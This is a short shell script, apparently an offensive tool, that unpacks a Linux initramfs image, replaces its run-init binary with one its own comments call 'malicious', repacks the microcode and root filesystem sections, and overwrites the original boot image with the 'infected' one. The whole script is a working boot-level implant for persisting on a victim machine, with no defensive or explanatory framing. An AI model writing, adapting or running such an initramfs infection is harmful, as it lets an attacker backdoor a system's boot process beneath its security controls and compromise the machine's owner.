#!/bin/sh

# prepare the working directories in /tmp
mkdir /lost+found/new-initramfs

# extract initrd image
unmkinitramfs ${1} /lost+found/new-initramfs

# copy malicious run-init to victim
rm /lost+found/new-initramfs/main/usr/bin/run-init
mv /lost+found/old-initramfs/main/usr/bin/run-init /lost+found/new-initramfs/main/usr/bin/run-init

# add the first microcode firmware
find /lost+found/new-initramfs/early -print0 | cpio --null --create --format=newc > /lost+found/infected-initrd

# add the second microcode firmware
find /lost+found/new-initramfs/early2/kernel -print0 | cpio --null --create --format=newc >> /lost+found/infected-initrd

# add the ram fs file system
find /lost+found/new-initramfs/main | cpio --create --format=newc | lz4 -l -c >> /lost+found/infected-initrd

# replace initrd 
rm $1 && cp /lost+found/infected-initrd $1
